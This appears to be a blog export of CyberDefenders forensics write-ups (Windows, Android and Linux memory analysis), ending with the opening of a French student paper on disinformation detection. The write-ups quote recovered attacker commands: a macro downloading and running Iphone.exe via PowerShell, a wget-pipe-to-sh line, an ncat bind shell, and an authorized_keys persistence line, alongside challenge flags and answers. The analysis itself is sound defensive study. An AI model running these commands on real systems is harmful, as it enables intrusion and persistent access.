S-1-5-21-1649836244-3544936428-1548601679-1001 Full Name : User Comment : Account Type : Account Created : Sat Jan 26 19:40:22 2019 Z Name : Password Hint : forensics is boring Last Login Date : Fri Mar 22 23:22:01 2019 Z Pwd Reset Date : Thu Mar 21 19:13:09 2019 Z Pwd Fail Date : Thu Mar 21 19:14:49 2019 Z Login Count : 32 --\u0026gt; Password does not expire --\u0026gt; Password not required --\u0026gt; Normal user account I converted the Pwd Reset Date into the attended format: 03/21/2019 19:13:09.\nQ15. What version of Chrome is installed on the machine? # It\u0026rsquo;s very easy with Autopsy, under Data Artifacts \u0026gt; Installed Programs you will find Google Chrome and all related datas such as its version: Google Chrome v.72.0.3626.121. Without Autopsy, it\u0026rsquo;s a little bit more complicated. Obviously, the answer is in the SOFTWARE hive but not directly under Google key. In fact, it\u0026rsquo;s quite hard to find the good value as it\u0026rsquo;s located in an unintuitive location: SOFTWARE\\WOW6432Node\\Microsoft\\Windows\\CurrentVersion\\Uninstall\\Google Chrome.\nQ16. What is the HostUrl of Skype? # The question is quite strange, it\u0026rsquo;s unclear what you should to looking for. You need to find the URL where Skype was downloaded.\nFirst, I searched in the SOFTWARE hive using Registry Explorer EZ because this software allows you to search strings inside hive. Unfortunately I didn\u0026rsquo;t found the answer. My second idea was to extract the Skype exe file and extract strings. Once again, I didn\u0026rsquo;t found the answer.\nIn fact, I found two solutions:\nbrowse internet history located at Users/Karen/AppData/Local/Google/Chrome/User Data/Default/History in the download_url_chains table and you will see the URL.\nsearch for alternate data stream (ADS), more information here.\nI prefer the second method, as ADS are used by malwares, so it\u0026rsquo;s more usefull in the DFIR learning journey. In the case of a downloaded file, an ADS file named Zone.Identifier could be created to store the host URL. To see it, I used FTK Imager. Click on the file and the Zone.Identifier will be displayed in the right panel.\nAlternate Data Stream (ADS) named Zone.Identifier, contains datas such as HostUrl. You can also use other tools and even command line tool to see ADS. I guess you have to mount properly the image and/or perform other steps before. If you are interested in, take a look here: Forensic Analysis of the Zone.Identifier Stream.\nQ17. What is the domain name of the website Karen browsed on Alpaca care that the file AlpacaCare.docx is based on? # Another vague question. Open the document and you will see several links inside, like rcfalpaca.com or palominoalpacafarm.com. The second one is not directly displayed, you will find it in the page footer. Using the answer pattern provided by Cyberdefenders you will find that the correct answer is the second one.\nNote: you can also observe palominoalpacafarm.com in the web history.\n","date":"12 août 2023","permalink":"/write-up/cyberdefenders-digital-forensic-hireme/","section":"Write-up","summary":"The scenario:\nKaren is a security professional looking for a new job.","title":"Cyberdefenders · Digital Forensic · Hireme"},{"content":"The scenario:\nA company’s employee joined a fake iPhone giveaway. Our team took a disk image of the employee\u0026rsquo;s system for further analysis. As a soc analyst, you are tasked to identify how the system was compromised.\nAbstract # In this article, I investigate a cyber incident involving a fake iPhone giveaway that targeted an employee at a company. As a SOC analyst, my mission is to determine how the system was compromised. Through careful analysis, I uncover the victim machine\u0026rsquo;s hostname, identify the messaging app installed as WhatsApp, and trace the malicious download URL used by the attacker.\nThe investigation reveals that the attacker used obfuscated macros in a document to execute a program named \u0026ldquo;Iphone.exe,\u0026rdquo; downloaded from \u0026ldquo;http[:]//appIe.com/Iphone.exe.\u0026rdquo; The malware is identified as a Meterpreter trojan created using the Metasploit framework. The attacker\u0026rsquo;s IP address is found to be 155.94.69.27. Moreover, I discover the URL of the login page used in the fake giveaway as \u0026ldquo;http[:]//appIe.competitions.com/login.php,\u0026rdquo; and the password submitted to this page is obtained using the PasswordFox tool. Here is why you should to raise awareness against phishing, consequences could be harmfull.\nIllustration of an old hook. Q1. What is the hostname of the victim machine? # Autopsy seems to not support the AD1 format. So I extracted the SYSTEM Windows Registry located at Windows/System32/config/ using FTKImager. After, you can open it with various tools such as RegistryExplorer from Eric Zimmerman or AccessData Registry Viewer.\nAccording to this post, the machine name is located here: SYSTEM\\ControlSet00X\\Control\\ComputerName\\ComputerName. The path is a little bit different but it\u0026rsquo;s still the same logic: WIN-NF3JQEU4G0T.\nQ2. What is the messaging app installed on the victim machine? # Firstly, I tried to use Autopsy on this challenge, without success. Launching ingest module on the provided file only returns some email related strings, this is where I found the messaging app; WhatsApp. The \u0026ldquo;academic\u0026rdquo; method would be to look in Program Files and Program Files (x86) but there is nothing related to a messaging app. Sometimes, programs are installed directly on the user directory: Users/Semah/AppData/Local/, here you can find the WhatsApp directory.\nQ3. The attacker tricked the victim into downloading a malicious document. Provide the full download URL. # Firstly, I extracted all the WatsApp databases located at: Users/AppData/Roaming/WhatsApp/Databases and opened it with sqliteviewer.app. I found a conversation inside msgstore.db \u0026gt; message_ftsv2 with this message:\nokay you can check this file below : https : / / drive.google.com / file / d / 1l1xn6r - za4w1me2uze8lxh45gfhsw66d / view ? usp = sharing readme.txt https : / / drive.google.com / file / d / 1l1xn6r - za4w1me2uze8lxh45gfhsw66d / view ? usp = sharing \u0026amp; usp = embed_facebook\nUnfortunately, this is not the answer.\nI finally found this fantastic tool: WhatsApp Viewer which is very easy to use. When I opened the msgstore.db, the tool found an another discussion with the answer: http[:]//appIe.com/IPhone-Winners.doc. I wanted to know why I was unable to find theses messages. In fact, the messages was located in\u0026hellip; message table, I just didn\u0026rsquo;t saw them because of the interface! Lesson learned, be carreful and look for the good tool first.\nQ4. Multiple streams contain macros in the document. Provide the number of the highest stream. # Using the Oledump python script, you can find that the highest stream which contains macro (marqued with the \u0026ldquo;M\u0026rdquo; letter in the output bellow), is 10.\npython oledump_V0_0_75\\oledump.py export-folder\\IPhone-Winners.doc 1: 114 \u0026#39;\\x01CompObj\u0026#39; 2: 4096 \u0026#39;\\x05DocumentSummaryInformation\u0026#39; 3: 4096 \u0026#39;\\x05SummaryInformation\u0026#39; 4: 8473 \u0026#39;1Table\u0026#39; 5: 501 \u0026#39;Macros/PROJECT\u0026#39; 6: 68 \u0026#39;Macros/PROJECTwm\u0026#39; 7: 3109 \u0026#39;Macros/VBA/_VBA_PROJECT\u0026#39; 8: 800 \u0026#39;Macros/VBA/dir\u0026#39; 9: M 1170 \u0026#39;Macros/VBA/eviliphone\u0026#39; 10: M 5581 \u0026#39;Macros/VBA/iphoneevil\u0026#39; 11: 4096 \u0026#39;WordDocument\u0026#39; Q5. The macro executed a program. Provide the program name? # First, you have to extract both of the macros:\n$ python oledump_V0_0_75\\oledump.py -s 10 -v export-folder\\IPhone-Winners.doc Attribute VB_Name = \u0026#34;iphoneevil\u0026#34; Function lllllllll1l() Dim lllllllllll As String Dim llllllllll1 As String lllllllllll = Chr(97) [...] Chr(65) llllllllll1 = Chr(112) [...] Chr(100) \u0026amp; lllllllllll CreateObject(Chr(87) \u0026amp; Chr(83) \u0026amp; Chr(99) \u0026amp; Chr(114) \u0026amp; Chr(105) \u0026amp; Chr(112) \u0026amp; Chr(116) \u0026amp; Chr(46) \u0026amp; Chr(83) \u0026amp; Chr(104) \u0026amp; Chr(101) \u0026amp; Chr(108) \u0026amp; Chr(108)).Run llllllllll1, 0, True End Function $ python oledump_V0_0_75\\oledump.py -s 9 -v export-folder\\IPhone-Winners.doc Attribute VB_Name = \u0026#34;eviliphone\u0026#34; Attribute VB_Base = \u0026#34;1Normal.ThisDocument\u0026#34; Attribute VB_GlobalNameSpace = False Attribute VB_Creatable = False Attribute VB_PredeclaredId = True Attribute VB_Exposed = True Attribute VB_TemplateDerived = True Attribute VB_Customizable = True Private Sub _ Document_open() lllllllll1l End Sub The stream number 10 is obfuscated. I translated all the Chr function parameter into ASCII values and observed that it looks like base64. Here is the decoded payload (last line of the 10th stream) :\nCreateObject(WScript.Shell).Run invoke-webrequest - Uri \u0026#39;http://appIe.com/Iphone.exe\u0026#39; -OutFile \u0026#39;C:\\Temp\\IPhone.exe\u0026#39; -UseDefaultCredentialÀ, 0, True The malicious macro launch a downloading from the same domain as the user downloaded the infectied doc file, using Powershell.\nQ6. The macro downloaded a malicious file. Provide the full download URL. # Already answered in the previous question.\nQ7. Where was the malicious file downloaded to? (Provide the full path) # Already answered in the previous question.\nQ8. What is the name of the framework used to create the malware? # My antivirus gives me the answer as it deleted the file with a pop-up showing that the malware is a Meterpreter trojan. An other way is to calculate the Iphone.exe\u0026rsquo;s hash and search on VirusTotal, you will see that the program is related to Meterpreter too. A third way is to extract the file and extract the strings inside, I\u0026rsquo;m pretty sure that you will find Meterpreter inside. Unfortunately my AV doesn\u0026rsquo;t want to extract the file so I will consider this solution as valid too.\nAn internet research about \u0026ldquo;Meterpreter framework\u0026rdquo; gives the framework name: Metasploit.\nQ9. What is the attacker\u0026rsquo;s IP address? # VT provides various IoCs related to this malware, like these IP addresses:\n155.94.69.27\n192.168.0.30\n192.229.221.95\n20.99.133.109\n23.216.147.76\n52.185.73.156\nThanks to the answer pattern you can easily identifie the correct one. Otherwise, a string extraction should provides IP addresses too.\nQ10. The fake giveaway used a login page to collect user information. Provide the full URL of the login page? # I was stucked on this question for a while. I found the history database located at C:\\Users\\\u0026lt;username\u0026gt;\\AppData\\Roaming\\Mozilla\\Firefox\\Profiles\\\u0026lt;profile folder\u0026gt;\\places.sqlite into the moz_places table but when I wanted to open it with a SQLite viewer I didn\u0026rsquo;t see the answer. I saw a weird domain named https://for1.q21.ctfsecurinets.com and when I opened the same file with Autopsy I saw the answer: http://appIe.competitions.com/login.php.\nThanks to @0xHasanM, I finally understood the problem. It was because of the WAL file, used to ensure data integrity in the database. Some datas are contained in places.sqlite-wal, like the answer. That\u0026rsquo;s why Autopsy retrieved the flag, because it also used the WAL with the SQLite file, and that\u0026rsquo;s why my online viewer couldn\u0026rsquo;t retrieve the login page URL.\nQ11. What is the password the user submitted to the login page? # I used PasswordFox, selected the profile folder and opened it with the tool, the password is displayed on the screen.\n","date":"4 août 2023","permalink":"/write-up/cyberdefenders-digital-forensics-phishy/","section":"Write-up","summary":"The scenario:\nA company’s employee joined a fake iPhone giveaway. Our team took a disk image of the employee\u0026rsquo;s system for further analysis.","title":"Cyberdefenders · Digital Forensics · Phishy"},{"content":"The Scenario:\nOur IR team took a disk dump of the android phone. As a soc analyst, analyze the dump and answer the provided questions.\nI used this online tool to open SQL database : Sqliteviewer.\n1896 phone. Abstract # To complete the challenge, you have to browse all the given files. Be curious, take the time to understand how the data is organized and use a tool like grep. It\u0026rsquo;s a good challenge to show how sensitive smartphones are. Companies focuses on the protection of computer and server but not smartphone, while they contain very personnal and sensitive datas. Here what you can found in a smartphone:\ncontacts informations (mail, phone number, names\u0026hellip;)\ndownloads timestamps and application informations\npersonnal usage information like:\nbattery cycles\napplications used, when and for how long\nsecrets like WiFi password\nmedias (photos, videos, music\u0026hellip;)\nAnd surrely many other personnal datas such as applications informations, passwords, messages\u0026hellip;\nQ1. What is the email address of Zoe Washburne? # AgentData \u0026gt; contacts3.db\nThis file seems to contains the contact datas: zoewash@0x42.null. AgentData directory seems interesting as it contains general informations.\nQ2. What was the device time in UTC at the time of acquisition? (hh:mm:ss) # LiveData \u0026gt; device_datetime_utc.txt\nThe LiveData directory seems to contains general system information related.\nanswer: 18:17:56\nQ3. What time was Tor Browser downloaded in UTC? (hh:mm:ss) # AgentData \u0026gt; downloads.db\nThe lastmod column provide a timestamp, convert it to UTC format: 1619725346000 = 2021-04-29 19:42:26 UTC.\nQ4. What time did the phone charge to 100% after the last reset? (hh:mm:ss) # There is an interesting file here : Live Data \u0026gt; Dumpsys Data \u0026gt; batterystats.txt.\nThis file logs battery events, we can see the last reset time, and bellow when the battery was fully charged:\nRESET:TIME: 2021-05-21-13-12-19 ... +5m01s459ms (3) 100 status=full charge=2665 Adding 5m01s to 13:12:19 gives the answer: 13:17:20.\nQ5. What is the password for the most recently connected WIFI access point? # I didn\u0026rsquo;t found the answer. Thanks to this WU CyberDefenders: LGDroid, I discovered a usefull ressource, the SANS Smartphone Cheatsheet. According to the poster, username and passwords can be found here: /data/com.android.providers.settings/. The PreSharedKey tag provides the answer: ThinkingForest!.\nQ6. What app was the user focused on at 2021-05-20 14:13:27? # The question seems to insinuate that the app was running during the acquisition. That\u0026rsquo;s why I searched on \u0026ldquo;14:13:27\u0026rdquo; in Live Data \u0026gt; usage_stats.txt and found Youtube.\ntime=\u0026#34;2021-05-20 14:13:27\u0026#34; type=MOVE_TO_BACKGROUND package=com.lge.launcher3 class=com.lge.launcher3.LauncherExtension flags=0x0 time=\u0026#34;2021-05-20 14:13:27\u0026#34; type=STANDBY_BUCKET_CHANGED package=com.google.android.youtube standbyBucket=10 reason=u-si flags=0x0 time=\u0026#34;2021-05-20 14:13:27\u0026#34; type=MOVE_TO_FOREGROUND package=com.google.android.youtube class=com.google.android.apps.youtube.app.application.Shell_HomeActivity flags=0x0 time=\u0026#34;2021-05-20 14:13:27\u0026#34; type=MOVE_TO_BACKGROUND package=com.google.android.youtube class=com.google.android.apps.youtube.app.application.Shell_HomeActivity flags=0x0 time=\u0026#34;2021-05-20 14:13:27\u0026#34; type=MOVE_TO_FOREGROUND package=com.google.android.youtube class=com.google.android.apps.youtube.app.watchwhile.WatchWhileActivity flags=0x0 Q7. How much time did the suspect watch Youtube on 2021-05-20? (hh:mm:ss) # Always in Live Data \u0026gt; usages_stats.txt, I searched for package=com.google.android.youtube and I found data like this :\nIn-memory weekly stats timeRange=\u0026#34;5/20/2021, 11:16 AM ??5/21/2021, 1:17 PM\u0026#34; packages package=com.hy.system.fontserver totalTime=\u0026#34;00:00\u0026#34; lastTime=\u0026#34;1969-12-31 18:00:00\u0026#34; appLaunchCount=0 package=com.android.LGSetupWizard totalTime=\u0026#34;00:00\u0026#34; lastTime=\u0026#34;1969-12-31 18:00:00\u0026#34; appLaunchCount=0 package=com.google.android.youtube totalTime=\u0026#34;8:34:29\u0026#34; lastTime=\u0026#34;2021-05-20 22:47:57\u0026#34; appLaunchCount=1 Unfortunately, 08:34:29 is not the answer. I supposed a rounded error, tried 08:34:30, and it worked. I checked the advice provided by the challenge and the attended method was to check the date of the last MOVE_TO_FOREGROUND activity and last MOVE_TO_BACKGROUND and substract:\nMOVE_TO_FOREGROUND package=com.google.android.youtube -\u0026gt; 14:13:27\nMOVE_TO_BACKGROUND package=com.google.android.youtube -\u0026gt; 22:47:57\nWe find 08:34:30, but quite a tricky question, as the field totalTime is filled.\nQ8. \u0026ldquo;suspicious.jpg: What is the structural similarity metric for this image compared to a visually similar image taken with the mobile phone? # The first challenge here is to understand the question. You have to found the second image, it is located in sdcard \u0026gt; DCIM \u0026gt; Camera. The structural similarity metric is used to measure visual similarity between two images, this online tool allows me to calculate it: http://darosh.github.io/image-ms-ssim-js/test/browser_test.html. I found a SSIM of 0.99 which is consisent, as both images are similars.\n","date":"4 août 2023","permalink":"/write-up/cyberdefenders-digital-forensics-lgdroid/","section":"Write-up","summary":"The Scenario:\nOur IR team took a disk dump of the android phone.","title":"Cyberdefenders · Digital Forensics · Lgdroid"},{"content":"The Scenario:\nUsing Volatility, utilize your memory analysis skills as a security blue team analyst to Investigate the provided Linux memory snapshots and figure out attack details.\nLinux syscall illustration. Abstract # The investigation reveals the presence of a suspicious process involving ncat launching scripts, indicating a potential backdoor for gaining persistence. However, despite efforts, the hidden message within the backdoor could not be found, and the attacker\u0026rsquo;s IP address and local port were identified from the network statistics. The first command executed by the attacker involved running Python to spawn /bin/bash.\nThe article also explores how the attacker maintained access to the compromised machine even after changing the user\u0026rsquo;s password. A thorough analysis of the vim process memory reveals the use of SSH keys for persistence, and the article concludes with the identification of the rootkit used, named sysemptyrect, which employs crc65 encryption.\nQ1. What is the CentOS version installed on the machine? # The archive name provides the kernel version, using the CentOS Wikipedia page you will see that the corresponding CentOS version is 7.7-1908.\nQ2. There is a command containing a strange message in the bash history. Will you be able to read it? # Using linux_bash plugin we could see that the user put content in a file : echo \u0026quot;c2hrQ1RGe2wzdHNfc3Q0cnRfdGgzXzFudjNzdF83NWNjNTU0NzZmM2RmZTE2MjlhYzYwfQo=\u0026quot; \u0026gt; y0ush0uldr34dth1s.txt. Decode the base64 using cyberchef gives the flag.\nQ3. What is the PID of the suspicious process? # linux_pstree shows more than 200 processes. Instead to explore each of them, a clever way is to directly focuse on strange processes using linux_malfind :\nProcess: gnome-terminal- Pid: 2535 Address: 0x7f1d414bf000 File: Anonymous Mapping Protection: VM_READ|VM_WRITE|VM_EXEC Flags: VM_READ|VM_WRITE|VM_EXEC|VM_MAYREAD|VM_MAYWRITE|VM_MAYEXEC|VM_ACCOUNT|VM_CAN_NONLINEAR 0x007f1d414bf000 78 5f 00 00 00 00 00 00 00 00 00 00 00 00 00 00 x_.............. 0x007f1d414bf010 53 41 57 41 56 41 55 55 48 8b df 48 81 ec 50 02 SAWAVAUUH..H..P. 0x007f1d414bf020 00 00 48 8b 43 10 48 83 e8 01 48 8d 74 24 58 48 ..H.C.H...H.t$XH 0x007f1d414bf030 c7 c1 13 00 00 00 48 89 46 08 48 8d 76 08 48 83 ......H.F.H.v.H. Exploring this PID on the pstree, proove that there is something suspicious, as insmod is used to insert modules into the kernel :\n... .gnome-terminal- 2535 1000 ..gnome-pty-helpe 2621 1000 ..bash 2622 1000 ...sudo 3612 ....insmod 3614 ... Unfortunately, that\u0026rsquo;s none of them. Suspicious activity is not always malicious.\nExploring again the pstree, we can see something else suspicious :\n.ncat 2854 ..bash 2876 ...python 2886 ....bash 2887 .....vim 3196 This one is more suspicious than the previous one because of the ncat (network process) launching some scripts.\nQ4. The attacker downloaded a backdoor to gain persistence. What is the hidden message in this backdoor? # I was unable to find this answer. I tried to list all the cached files using linux_cached_file to see if there is some suspicious one and dump it, but I found nothing. I tried to dump the suspicious process but without results too.\nI also tried the github present in the bash history but I didn\u0026rsquo;t see the hidden line pushed to the right :\nos.system(\u0026#39;wget -O - https://pastebin.com/raw/nQwMKjtZ 2\u0026gt;/dev/null|sh\u0026#39;) A write-up gave me the flag because the links seems not valid anymore. This pastebin should contains a base64 strings which is the flag :\n### Congratz : c2hrQ1RGe3RoNHRfdzRzXzRfZHVtYl9iNGNrZDAwcl84NjAzM2MxOWUzZjM5MzE1YzAwZGNhfQo= nohup ncat -lvp 12345 -4 -e /bin/bash \u0026gt; /dev/null 2\u0026gt;/dev/null \u0026amp; Q5. What are the attacker\u0026rsquo;s IP address and the local port on the targeted machine? # Using linux_netstat returns a lot of information but at the end of the output we could see theses lines :\nTCP 192.168.49.135 :12345 192.168.49.1 :44122 ESTABLISHED ncat/2854 TCP 192.168.49.135 :12345 192.168.49.1 :44122 ESTABLISHED bash/2876 TCP 192.168.49.135 :12345 192.168.49.1 :44122 ESTABLISHED python/2886 TCP 192.168.49.135 :12345 192.168.49.1 :44122 ESTABLISHED bash/2887 TCP 192.168.49.135 :12345 192.168.49.1 :44122 ESTABLISHED vim/3196 The local port is the one written in the script above, and the attacker\u0026rsquo;s IP address is the other.\nQ6. What is the first command that the attacker executed? # We can\u0026rsquo;t see other commands with linux_bash, a different way to investigate on this kind of clues is the linux_psaux plug-in. The output bottom is interesting, as it contains the malware related command line arguments :\n2854 0 0 ncat -lvp 12345 -4 -e /bin/bash 2876 0 0 /bin/bash 2886 0 0 python -c import pty; pty.spawn(\u0026#34;/bin/bash\u0026#34;) 2887 0 0 /bin/bash 3196 0 0 vim /etc/rc.local 3271 0 0 /usr/sbin/abrt-dbus -t133 3279 89 89 cleanup -z -t unix -u 3280 89 89 trivial-rewrite -n rewrite -t unix -u 3281 0 0 local -t unix 3299 0 0 sleep 60 3612 0 0 sudo insmod lime-3.10.0-1062.el7.x86_64.ko path=/Linux64.mem format=lime 3614 0 0 insmod lime-3.10.0-1062.el7.x86_64.ko path=/Linux64.mem format=lime Just after the netcat, the attackers run python -c import pty; pty.spawn(\u0026quot;/bin/bash\u0026quot;).\nQ7. After changing the user password, we found that the attacker still has access. Can you find out how? # This question is quite hard. First, you have to investigate on the vim process. Why this process?\nwe didn\u0026rsquo;t care of it yet\nit\u0026rsquo;s a part of the cyber kill chain\nintuition I guess?\nAfter dumping the process using linux_dump_map, we could see that the process memory contains lot of information. It contains so much that is difficult to know what to look for. We are looking for malware persistence mecanisms, we can try to ask to ChatGPT what are the most famous persistence mecanism. We can investigate on several answer but the good one is SSH keys. If we search on these files for ssh-things, we will find the answer :\nstrings *.vma|grep -i \u0026#39;ssh\u0026#39; #!/bin/sh # Well played : c2hrQ1RGe3JjLmwwYzRsXzFzX2Z1bm55X2JlMjQ3MmNmYWVlZDQ2N2VjOWNhYjViNWEzOGU1ZmEwfQo= echo \u0026#34;ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQCxa8zsyblvEoajgtqciK2XAs1UwNAeV3RcXacqicjzuad2jH7JQdIaqVW4jfEt8h7w+Rei1kZL/xqikGS/AGb2ZLqVSUKWF9afaeE850On4+c1A0wu9n/7N/t2QSnw71BZnvH35+qgENJzFGgFxJEsvZqbawFHD8B426qKFYD+LMAnnFtnrzFj8U+cewG6ODl0Obe8yP/Awv0HYFdhK/IY+t7u2Ywrgp3bXF1l5m+Zk40BqpEYfFzhawYOc/tar1HqaJnYdvqHjwhZeDGYkILvYt4veVc/DjVPX1UjLvlpWv1/AhmLAWgWyUORBwDjM5km0HjN/CY5kWoasXgd1jHD tw0phi@workstation\u0026#34; \u0026gt;\u0026gt; /home/k3vin/.ssh/authorized_keys \u0026amp;\u0026amp; chmod 600 /home/k3vin/.ssh/authorized_keys \u0026#34;/etc/rc.local\u0026#34; 3L, 596C 1,1 All zed_keys\u0026gt; /home/k3vin/.ssh/authorized_keys \u0026amp;\u0026amp; chmod 600 /home/k3vin/.ssh/authori The first base64 encoded string is the flag. It\u0026rsquo;s interesting to capitalize on knowledge to understand this persistance mecanism :\nThis code add a SSH key for the K3vin user and modify its permissions in a manner that only this user can modify it.\nQ8. What is the name of the rootkit that the attacker used? # Thanks to this tutorial, Analyzing Linux Rootkits with Volatility, we learned some ways to detect rootkit on a Linux system. One of them is to investigate on syscalls using linux_check_syscall. This command returns lot of information but we are only interested in the hooked syscalls.\nTable Name Index System Call Handler Address Symbol ---------- ----- ------------------------ ------------------ ------------------------------------------------------------ 64bit 88 0xffffffffc0a12470 HOOKED: sysemptyrect/syscall_callback ... 64bit 332 0x6461625f6e726177 HOOKED: UNKNOWN Firstly, I was quite lost ; how can I find the rootkit name ? In fact, the Symbol column contains the rootkit name here.\nQ9. The rootkit uses crc65 encryption. What is the key? # Firstly, I searched on internet if this rootkit has a known crc65 encryption key. I found many Write-Up but searching sysemptyrect in the dump file (using grep for example) will give you the key.\n","date":"2 août 2023","permalink":"/write-up/cyberdefenders-digital-forensics-seized/","section":"Write-up","summary":"The Scenario:\nUsing Volatility, utilize your memory analysis skills as a security blue team analyst to Investigate the provided Linux memory snapshots and figure out attack details.","title":"Cyberdefenders · Digital Forensics · Seized"},{"content":"The Scenario:\nAs a member of the Security Blue team, your assignment is to analyze a memory dump using Redline and Volatility tools. Your goal is to trace the steps taken by the attacker on the compromised machine and determine how they managed to bypass the Network Intrusion Detection System \u0026ldquo;NIDS\u0026rdquo;. Your investigation will involve identifying the specific malware family employed in the attack, along with its characteristics. Additionally, your task is to identify and mitigate any traces or footprints left by the attacker.\nTools:\nVolatility2 \u0026amp; 3 RedLine Telegram channel. Abstract # This Blue Team challenge writeup involves analyzing a suspicious process found in memory using the volatility framework. The process name is \u0026ldquo;oneetx.exe\u0026rdquo; and exhibits a suspicious behavior with the memory protection set to \u0026ldquo;PAGE_EXECUTE_READWRITE,\u0026rdquo; which can evade antivirus detection.\nFurther investigation reveals a child process named \u0026ldquo;rundll32.exe\u0026rdquo; associated with the suspicious process. The investigation also identifies the presence of a VPN program named \u0026ldquo;Outline.exe,\u0026rdquo; which might be responsible for the attacker\u0026rsquo;s VPN connection. However, the attacker\u0026rsquo;s IP address cannot be retrieved using Volatility2, but Volatility3 successfully extracts the IP address as \u0026ldquo;77.91.124.20.\u0026rdquo; By cross-referencing this IP address on VirusTotal, it is determined that the malware belongs to the \u0026ldquo;RedLine Stealer\u0026rdquo; family.\nAdditionally, the URL of the PHP file visited by the attacker is found on VirusTotal, as well as by analyzing the process memory, resulting in the complete URL. Finally, the full path of the malicious executable, \u0026ldquo;oneetx.exe,\u0026rdquo; is obtained through process memory analysis.\n1. What is the name of the suspicious process? # vol.py -f \u0026lt;file\u0026gt; imageinfo vol.py -f \u0026lt;file\u0026gt; --profile=\u0026lt;profile\u0026gt; malfind Process: oneetx.exe Pid: 5896 Address: 0x400000 Vad Tag: VadS Protection: PAGE_EXECUTE_READWRITE Flags: PrivateMemory: 1, Protection: 6 0x0000000000400000 4d 5a 90 00 03 00 00 00 04 00 00 00 ff ff 00 00 MZ.............. 0x0000000000400010 b8 00 00 00 00 00 00 00 40 00 00 00 00 00 00 00 ........@....... 0x0000000000400020 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 ................ 0x0000000000400030 00 00 00 00 00 00 00 00 00 00 00 00 00 01 00 00 ................ PAGE_EXECUTE_READWRITE allows the program to modify its code or be modified by another process during execution. This could help to evade antivirus detection. When malfind found something, it\u0026rsquo;s likely a bad new as it scan the image to find injected code blocks.\n2. What is the child process name of the suspicious process? # pstree 0xffffad8189b41080:oneetx.exe 5896 8844 5 0 2023-05-21 22:30:56 UTC+0000 . 0xffffad818d1912c0:rundll32.exe 7732 5896 1 0 2023-05-21 22:31:53 UTC+0000 3. What is the memory protection applied to the suspicious process memory region? # Fount with malfind.\n4. What is the name of the process responsible for the VPN connection? # A program looks different as it\u0026rsquo;s not a Windows default: Outline.exe. Searching this name on internet allows you to know that this a VPN program.\n5. What is the attacker\u0026rsquo;s IP address? # Surprisingly, Volatility2 was not able to retrieve this information. When I tried to perform netscan, the connection was marked as close and I can\u0026rsquo;t get the remode IP address.\nWith vol3, you can retrieve this information easily:\nvol.py -f \u0026#34;MemoryDump.mem\u0026#34; windows.netscan|grep -i 5896 Offset\tProto\tLocalAddr\tLocalPort\tForeignAddr\tForeignPort\tState\tPID\tOwner\tCreated 0xad818de4aa20.0TCPv4\t10.0.85.2DB scan55462fin 77.91.124.20 80 CLOSED\t5896\toneetx.exe\t2023-05-21 23:01:22.000000 6. Based on the previous artifacts. What is the name of the malware family? # We have few IOCs, the most usefull one is probably the IP address. Using VirusTotal, in the details section, on the Google results part, you will see that is a RedLine Stealer.\n7. What is the full URL of the PHP file that the attacker visited? # You can retrieve this information on VirusTotal too. But, you can also dump the process memory and search on it:\nvol.py -f \u0026#34;MemoryDump.mem\u0026#34; -o \u0026lt;output_dir\u0026gt; windows.memmap --dump --pid 5896 # extracts strings strings -el \u0026lt;output_dir\u0026gt;/pid.5896.dmp strings_5896 # search on the IOC grep -i \u0026#39;http://77.91.124.20\u0026#39; strings_5896 You will find the complete path.\n8. What is the full path of the malicious executable? # Using the same file, you can look up for the file name and retrieve is location:\ngrep -ie \u0026#39;oneetx\\.exe\u0026#39; strings_5896 ","date":"22 juillet 2023","permalink":"/write-up/cyberdefenders-digital-forensics-redline/","section":"Write-up","summary":"The Scenario:\nAs a member of the Security Blue team, your assignment is to analyze a memory dump using Redline and Volatility tools.","title":"Cyberdefenders · Digital Forensics · Redline"},{"content":"Nathan DUNAND (auteur) - Jean SEVAUX - Clément LAISNÉ - Corentin HUVELIN\nUne décision commune de Washington et Moscou, qui gèlerait le conflit [Ukrainien]. Je n\u0026rsquo;y crois pas. Nous sommes au début d\u0026rsquo;un cycle de guerre froide qui va durer trente ou cinquante ans. Il y aura des guerres économiques, des guerres informationnelles et des conflits délocalisés.\nAmiral Pascal Ausseur dirige la Fondation méditerranéenne d\u0026rsquo;études stratégiques. 22 septembre 2022 dans l’Express\nAbstract # Cet article présente un projet d\u0026rsquo;ingénierie visant à automatiser la détection de la manipulation de l\u0026rsquo;information. Il se concentre sur la lutte informatique d\u0026rsquo;influence, qui désigne les actions visant à manipuler l\u0026rsquo;opinion publique via les médias numériques et les réseaux sociaux. L\u0026rsquo;objectif est de développer un outil capable de détecter la désinformation en ligne à partir d\u0026rsquo;un jeu de données. Le processus de détection doit être résilient, rapide, expliquable et produire des informations pertinentes pour les analystes.\nLe projet se base sur des indicateurs issus de la littérature scientifique tels que le nombre de mots, la longueur des tweets, la fréquence d\u0026rsquo;utilisation des hashtags, le score de sentiment, etc. Une méthodologie en trois étapes (homogénéisation, enrichissement et corrélation) est utilisée pour traiter les données et produire une visualisation. Une comparaison entre trois datasets traités par notre outil est effectuée et permet de discriminer des comptes et des datasets suspicieux.\nDes perspectives d\u0026rsquo;amélioration sont également discutées, notamment l\u0026rsquo;extension de la collecte de données à d\u0026rsquo;autres plateformes et langues, ainsi que l\u0026rsquo;utilisation de l\u0026rsquo;apprentissage automatique pour la classification des comptes légitimes et non légitimes.\nIntroduction # Cet article synthétise notre projet de quatrième année d\u0026rsquo;école d\u0026rsquo;ingénieur. Il vise à exposer les réalisations, les résultats, ainsi que les problèmes auxquels nous avons été confrontés pendant ce projet.\nIl s\u0026rsquo;inscrit dans la formation d\u0026rsquo;ingénieur de quatrième année. Il a pour objectif de nous confronter à des problématiques réelles, que nous explorons avec une démarche ingénieur, dans le but de présenter notre projet et nos résultats. La thématique est à notre initiative, un professeur nous a aiguillé lors de rendus réguliers durant cette année.\nLa Lutte d\u0026rsquo;Influence Informatique (L2I) fait référence aux actions employées par les acteurs étatiques, activistes ou organisations pour manipuler ou influencer l\u0026rsquo;opinion publique à travers les médias numériques ou les réseaux sociaux.\nCela peut impliquer l\u0026rsquo;utilisation de techniques de désinformation, de diffusion de fausses informations, de manipulation des réseaux sociaux, de piratage ou de création de faux profils. Les objectifs pouvant être de façonner les perceptions, semer la confusion ou influencer des comportements en ligne.\nÉtat de l\u0026rsquo;art # La détection de la désinformation en ligne est détectable avec des algorithmes de Deep Learning 1, ils offrent de bons résultats.\nCependant, il est difficile de trouver des jeux de données pertinents, à jour, et suffisamment larges. Les algorithmes de détections doivent dorénavant se baser sur le contenu des auteurs 